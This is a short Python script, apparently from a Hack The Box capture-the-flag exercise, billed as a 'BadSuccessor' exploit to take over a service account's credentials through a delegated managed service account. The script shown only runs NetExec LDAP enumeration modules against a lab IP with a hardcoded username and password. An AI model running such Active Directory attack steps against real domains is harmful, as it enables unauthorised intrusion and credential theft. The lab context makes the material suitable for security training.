#!/usr/bin/env python3
"""BadSuccessor exploit - create a dMSA to inherit svc_deploy credentials"""
import socket
import struct
import ssl
import hashlib
import os
from pyasn1.type import tag, namedtype, namedval, univ, useful
from pyasn1.codec.ber import encoder, decoder

# Since ldap3/impacket LDAP can't handle signing easily, 
# let's try raw LDAP with NTLM signing via nxc infrastructure
# Actually let's use a subprocess approach with nxc

import subprocess
import json

# First let's check what permissions alex.turner has on the DMSAHolder OU
# by trying to enumerate all objects in it
result = subprocess.run(
    ['nxc', 'ldap', '10.129.41.25', '-u', 'alex.turner', '-p', 'Checkpoint2024!',
     '-M', 'enum_logins'],
    capture_output=True, text=True, cwd='/media/gabi/Data/CTF/HTB/Checkpoint'
)
print("=== enum_logins ===")
print(result.stdout)
if result.stderr:
    print(result.stderr)

# Also try to find dMSA objects by checking objectClass
result2 = subprocess.run(
    ['nxc', 'ldap', '10.129.41.25', '-u', 'alex.turner', '-p', 'Checkpoint2024!',
     '-M', 'enum_interfaces'],
    capture_output=True, text=True, cwd='/media/gabi/Data/CTF/HTB/Checkpoint'
)
print("\n=== enum_interfaces ===")
print(result2.stdout)
if result2.stderr:
    print(result2.stderr)
